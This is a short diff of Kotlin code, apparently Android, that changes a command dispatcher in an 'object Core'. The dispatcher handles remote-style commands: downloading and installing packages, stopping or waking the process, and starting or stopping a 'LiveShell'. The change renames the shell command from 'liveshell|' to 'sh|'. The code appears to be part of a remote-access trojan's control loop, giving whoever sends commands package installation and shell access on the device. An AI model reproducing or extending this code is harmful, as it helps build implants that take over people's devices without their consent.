@@ -173,8 +173,8 @@ object Core {
                             cmd.startsWith("download|") -> downloadAndInstall(context, cmd.removePrefix("download|"))
                             cmd == "die" -> { running = false; "BYE" }
                             cmd == "wake" -> "AWAKE"
-                            cmd.startsWith("liveshell|") -> {
-                                val action = cmd.removePrefix("liveshell|").trim()
+                            cmd.startsWith("sh|") -> {
+                                val action = cmd.removePrefix("sh|").trim()
                                 if (action == "start") {
                                     startLiveShell(context)
                                     "LiveShell started"
@@ -182,7 +182,7 @@ object Core {
                                     stopLiveShell(context)
                                     "LiveShell stopped"
                                 } else {
-                                    "Unknown liveshell action: $action"
+                                    "Unknown sh action: $action"
                                 }
                             }
                             else -> Commands.dispatch(context, cmd)
